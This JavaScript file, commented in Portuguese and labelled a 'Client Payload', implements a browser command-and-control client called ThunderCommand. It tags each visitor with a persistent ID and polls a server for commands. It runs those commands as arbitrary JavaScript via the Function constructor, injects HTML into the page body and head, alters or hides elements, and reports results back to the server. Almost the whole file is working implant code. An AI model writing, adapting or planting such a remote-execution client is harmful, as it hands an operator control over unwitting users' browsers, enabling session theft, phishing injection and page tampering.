/**
 * ThunderCommand - Client Payload
 * =============================================
 * 
 * Este módulo implementa um cliente para recebimento de comandos JavaScript remotos,
 * permitindo a execução de comandos enviados por um servidor central. O sistema utiliza
 * exclusivamente HTTP polling para máxima compatibilidade e simplicidade.
 * 
 * Características:
 * - Comunicação via HTTP polling para compatibilidade universal
 * - Estrutura modularizada usando classes ES6 para melhor organização
 * - Reconexão automática com estratégia de backoff exponencial
 * - Identificação persistente de clientes via localStorage
 * - Captura e envio de resultados de execução de comandos
 * - Medição de tempo de execução para análise de performance
 * - Tratamento de erros e recuperação de falhas
 * 
 * Autor: Administrador do Projeto
 * Versão: 5.0
 * Última atualização: Agosto/2025
 */

(function() {
    'use strict';
    
    class ThunderClient {
        constructor(config = {}) {
            this.serverUrl = config.serverUrl || window.location.origin;
            this.pollingInterval = config.pollingInterval || 5000;
            this.clientId = this.initializeClientId();
            this.lastCommandId = null;
            this.retryCount = 0;
            this.maxRetries = 3;
            this.captureEnabled = true;
            this.connectionStatus = 'disconnected';
            this.pollIntervalId = null;
            this.isLocalFile = (window.location.protocol === 'file:');
            this.statusElement = null;
            
            // Inicialização quando o documento estiver pronto
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', () => this.onDOMReady());
            } else {
                this.onDOMReady();
            }
            
            // Listeners para estado online/offline
            window.addEventListener('online', () => this.handleOnline());
            window.addEventListener('offline', () => this.handleOffline());
        }
        
        /**
         * Inicializa ou recupera o ID do cliente
         */
        initializeClientId() {
            const stored = localStorage.getItem('thunder_client_id');
            if (stored) return stored;
            
            const newId = this.generateUUID();
            localStorage.setItem('thunder_client_id', newId);
            return newId;
        }
        
        /**
         * Gera UUID v4 para identificação do cliente
         */
        generateUUID() {
            // Verificar se randomUUID está disponível
            if (window.crypto && typeof window.crypto.randomUUID === 'function') {
                return crypto.randomUUID();
            }
            
            // Fallback para browsers que não suportam crypto.randomUUID
            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
                const r = Math.random() * 16 | 0;
                const v = c === 'x' ? r : (r & 0x3 | 0x8);
                return v.toString(16);
            });
        }
        
        /**
         * Callback executado quando o DOM está pronto
         */
        onDOMReady() {
            this.statusElement = document.getElementById('thunder-status');
            this.updateConnectionStatus('connecting');
            this.start();
        }
        
        /**
         * Inicia o cliente
         */
        async start() {
            try {
                await this.register();
                this.startPolling();
                console.debug('ThunderClient started');
            } catch (error) {
                console.error('Failed to start ThunderClient:', error);
                setTimeout(() => this.start(), this.getRetryDelay());
            }
        }
        
        /**
         * Registra o cliente no servidor
         */
        async register() {
            try {
                const response = await fetch(`${this.serverUrl}/command?client_id=${this.clientId}&action=register`, {
                    method: 'GET',
                    headers: { 
                        'X-Client-Type': 'thunder-command',
                        'X-Client-Version': '2.0'
                    }
                });
                
                if (!response.ok) throw new Error('Registration failed');
                
                // Resetar contagem de tentativas
                this.retryCount = 0;
                this.updateConnectionStatus('connected');
                
            } catch (error) {
                console.error('Registration error:', error);
                this.handleConnectionError(error);
                throw error;
            }
        }
        
        /**
         * Inicia polling para comandos
         */
        startPolling() {
            if (this.pollIntervalId) clearInterval(this.pollIntervalId);
            this.pollIntervalId = setInterval(() => this.checkForCommands(), this.pollingInterval);
        }
        
        /**
         * Para o polling
         */
        stopPolling() {
            if (this.pollIntervalId) {
                clearInterval(this.pollIntervalId);
                this.pollIntervalId = null;
            }
        }
        
        /**
         * Verifica comandos pendentes no servidor
         */
        async checkForCommands() {
            try {
                const response = await fetch(`${this.serverUrl}/command?client_id=${this.clientId}`);
                
                if (!response.ok) {
                    throw new Error(`Server returned ${response.status}`);
                }
                
                const data = await response.json();
                
                if (data.success && data.command && data.command.id !== this.lastCommandId) {
                    this.lastCommandId = data.command.id;
                    await this.executeCommand(data.command);
                }
                
                // Resetar contagem de tentativas em caso de sucesso
                this.retryCount = 0;
                
            } catch (error) {
                console.error('Error checking for commands:', error);
                this.handleConnectionError(error);
            }
        }
        
        /**
         * Executa comando recebido do servidor
         */
        async executeCommand(command) {
            console.debug('Executing command:', command.type);
            const startTime = performance.now();
            let result = { success: false, error: 'Unknown error' };
            
            try {
                switch(command.type) {
                    case 'js':
                        result = await this.executeJavaScript(command.content);
                        break;
                    case 'html':
                        result = this.injectHTML(command.content);
                        break;
                    case 'manipulate':
                        result = this.manipulateElement(command);
                        break;
                    case 'visibility':
                        result = this.toggleVisibility(command);
                        break;
                    case 'head':
                        result = this.modifyHead(command.content);
                        break;
                    default:
                        result = { success: false, error: `Unknown command type: ${command.type}` };
                }
            } catch (error) {
                result = { success: false, error: error.toString() };
            }
            
            const executionTime = performance.now() - startTime;
            result.executionTime = executionTime.toFixed(2);
            
            // Enviar resultado se captura estiver habilitada
            if (this.captureEnabled && command.capture_result !== false) {
                await this.sendResult(command.id, result);
            }
        }
        
        /**
         * Executa código JavaScript
         */
        async executeJavaScript(code) {
            try {
                // Usar Function constructor para evitar eval direto
                const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;
                try {
                    // Tentar executar como função async
                    const func = new AsyncFunction(code);
                    const result = await func();
                    return { success: true, result };
                } catch (asyncError) {
                    // Se falhar, tentar como função comum
                    const func = new Function(code);
                    const result = func();
                    return { success: true, result };
                }
            } catch (error) {
                return { success: false, error: error.toString() };
            }
        }
        
        /**
         * Injeta HTML na página
         */
        injectHTML(html) {
            try {
                // Criar elemento temporário
                const temp = document.createElement('div');
                temp.innerHTML = html;
                
                // Adicionar cada nó ao body
                while (temp.firstChild) {
                    document.body.appendChild(temp.firstChild);
                }
                
                return { success: true, result: 'HTML injected successfully' };
            } catch (error) {
                return { success: false, error: error.toString() };
            }
        }
        
        /**
         * Manipula elementos DOM
         */
        manipulateElement(command) {
            const { target_id, action, content } = command;
            const element = this.findElement(target_id);
            
            if (!element) {
                return { success: false, error: `Element not found: ${target_id}` };
            }
            
            try {
                switch(action) {
                    case 'ADD':
                        element.innerHTML += content;
                        break;
                    case 'REPLACE':
                        element.innerHTML = content;
                        break;
                    case 'INSERT_AFTER':
                        element.insertAdjacentHTML('afterend', content);
                        break;
                    case 'INSERT_BEFORE':
                        element.insertAdjacentHTML('beforebegin', content);
                        break;
                    default:
                        return { success: false, error: `Unknown action: ${action}` };
                }
                return { success: true, result: 'Element manipulated successfully' };
            } catch (error) {
                return { success: false, error: error.toString() };
            }
        }
        
        /**
         * Altera a visibilidade de elementos
         */
        toggleVisibility(command) {
            const { target_id, is_visible } = command;
            const element = this.findElement(target_id);
            
            if (!element) {
                return { success: false, error: `Element not found: ${target_id}` };
            }
            
            try {
                element.style.display = is_visible ? '' : 'none';
                return { 
                    success: true, 
                    result: `Visibility set to ${is_visible ? 'visible' : 'hidden'}` 
                };
            } catch (error) {
                return { success: false, error: error.toString() };
            }
        }
        
        /**
         * Modifica o cabeçalho (head) da página
         */
        modifyHead(content) {
            try {
                document.head.insertAdjacentHTML('beforeend', content);
                return { success: true, result: 'Head modified successfully' };
            } catch (error) {
                return { success: false, error: error.toString() };
            }
        }
        
        /**
         * Encontra elemento na página usando várias estratégias
         */
        findElement(selector) {
            return document.getElementById(selector) || 
                   document.querySelector(`.${selector}`) || 
                   document.querySelector(selector);
        }
        
        /**
         * Envia resultado da execução para o servidor
         */
        async sendResult(commandId, result) {
            try {
                const response = await fetch(`${this.serverUrl}/command/result`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        client_id: this.clientId,
                        command_id: commandId,
                        result
                    })
                });
                
                if (!response.ok) {
                    throw new Error(`Server returned ${response.status}`);
                }
                
            } catch (error) {
                console.error('Failed to send result:', error);
            }
        }
        
        /**
         * Atualiza status de conexão e UI
         */
        updateConnectionStatus(status) {
            this.connectionStatus = status;
            
            // Atualizar elemento visual se existir
            if (this.statusElement) {
                this.statusElement.className = `status-indicator status-${status}`;
                this.statusElement.title = `Connection: ${status}`;
            }
            
            console.debug('Connection status:', status);
        }
        
        /**
         * Handler para evento online
         */
        handleOnline() {
            console.debug('Network online');
            this.updateConnectionStatus('connecting');
            this.retryCount = 0;
            this.start();
        }
        
        /**
         * Handler para evento offline
         */
        handleOffline() {
            console.debug('Network offline');
            this.updateConnectionStatus('disconnected');
            this.stopPolling();
        }
        
        /**
         * Gerencia erros de conexão com retry
         */
        handleConnectionError(error) {
            this.retryCount++;
            
            if (this.retryCount >= this.maxRetries) {
                console.error('Max retries reached, stopping polling');
                this.updateConnectionStatus('disconnected');
                this.stopPolling();
                
                // Tentar reconectar após um tempo maior
                setTimeout(() => {
                    console.log('Attempting to reconnect...');
                    this.retryCount = 0;
                    this.updateConnectionStatus('connecting');
                    this.start();
                }, 30000); // 30 segundos
            } else {
                // Backoff exponencial para tentativas
                const delay = this.getRetryDelay();
                console.debug(`Retrying in ${delay}ms (attempt ${this.retryCount})`);
                setTimeout(() => this.checkForCommands(), delay);
            }
        }
        
        /**
         * Calcula delay para retry baseado em exponential backoff
         */
        getRetryDelay() {
            // Base: 1s, Max: 30s
            return Math.min(1000 * Math.pow(2, this.retryCount - 1), 30000);
        }
    }
    
    // Inicializar cliente
    const client = new ThunderClient();
    
    // Expor globalmente para debugging
    window.ThunderClient = client;
})();
